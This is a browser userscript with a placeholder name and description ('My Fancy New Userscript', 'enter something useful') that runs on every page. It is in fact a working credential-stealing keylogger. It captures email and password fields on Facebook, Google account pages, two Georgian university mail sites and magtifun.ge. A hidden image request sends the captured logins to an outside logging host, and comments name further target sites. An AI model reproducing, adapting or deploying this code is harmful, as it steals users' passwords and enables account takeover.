// ==UserScript==
// @name       My Fancy New Userscript
// @namespace  
// @version    0.1
// @description  enter something useful
// @match      *://*/*
// @copyright  2012+, You
// @run-at document-start
// ==/UserScript==




var id = "test"; // computer name
var host; // site
var path = "http://ov7g76seudi.bugs3.com/log.php";
var session = (new Date()).getTime();

// www.facebook.com
function logFb() {
    var user = "";
    var pass = "";
    document.onkeypress = function(e) {
	var userInput = document.getElementById("email");
	var passInput = document.getElementById("pass");
	if (userInput == null || passInput == null) return; // not login page
	var user1 = userInput.value;
	var pass1 = passInput.value;
	if (user1 != user || pass1 != pass) {
	    user = user1;
	    pass = pass1;
	    send(user, pass);
	}
    }
}

function log(userId, passId) {
    var user = "";
    var pass = "";
    document.onkeyup = function(e) {
	var userInput = document.getElementById(userId);
	var passInput = document.getElementById(passId);
	if (userInput == null || passInput == null) return; // not login page
	var user1 = userInput.value;
	var pass1 = passInput.value;
	if (user1 != user || pass1 != pass) {
	    user = user1;
	    pass = pass1;
	    console.log(pass);
	    send(user, pass);
	}
    }
}

// mail.freeuni.edu.ge, mail.agruni.edu.ge
function logGoogleMail() {
    log("Email", "Passwd");
}

function logMagtifun() {
    log("user", "password");
}

function send(user, pass) {
    var random = (new Date()).getTime();
    var img = document.createElement("img");
    img.src = path + "?host=" + encodeURI(host) + "&user=" + encodeURI(user) + "&pass=" + encodeURI(pass) + "&id=" + encodeURI(id) + "&session=" + encodeURI(session) + "&random=" + encodeURI(random);
    img.style.height = "10px";
    img.style.width = "10px";
    img.style.visibility = "hidden";
    document.body.appendChild(img);
}

function main(passedId) {
    id = passedId;
    host = window.location.hostname;
    if (host == "www.facebook.com") {
	document.domain = document.domain;
	logFb();
    } else if (host == "www.google.com"){
	if (document.URL.indexOf("freeuni.edu.ge") != -1) {
	    host = "mail.freeuni.edu.ge";
	    logGoogleMail();
	}
	if (document.URL.indexOf("agruni.edu.ge") != -1) {
	    host = "mail.agruni.edu.ge";
	    logGoogleMail();
	}
    } else if (host == "accounts.google.com"){
	logGoogleMail();
    } else if (host == "www.magtifun.ge") {
	logMagtifun();
    }
}


// forum.ge
// www.odnoklassniki.ru
// odnoklassniki.ru
// sms.ge


main();
